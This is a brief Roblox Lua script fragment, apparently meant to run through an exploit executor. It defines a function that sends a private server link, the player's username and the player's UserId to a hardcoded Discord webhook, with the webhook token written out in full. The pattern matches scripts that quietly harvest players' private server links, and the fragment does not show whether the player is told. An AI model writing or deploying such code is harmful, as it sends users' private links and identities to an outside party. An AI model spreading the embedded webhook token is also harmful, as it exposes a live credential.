-- ENVIAR LINK PARA DISCORD
local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1457436731161972839/xxiwGDyH5mbcQt6pUMnc4owb1D2RmFwjrIpZB3VWzXnKL0keKfP8QqaULUUmhuCa1W_T"

local function enviarDiscord(link)
	local data = {
		username = "Spidey Bot",
		embeds = {{
			title = "🔒 Private Server",
			description = link,
			color = 5793266,
			fields = {
				{ name = "Jogador", value = game.Players.LocalPlayer.Name, inline = true },
				{ name = "UserId", value = tostring(game.Players.LocalPlayer.UserId), inline = true }
			}
		}}
	}

	local req = (syn and syn.request) or (http and http.request) or request
	if req then
		req({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = {["Content-Type"]="application/json"},
			Body = HttpService:JSONEncode(data)
		})
	end
end
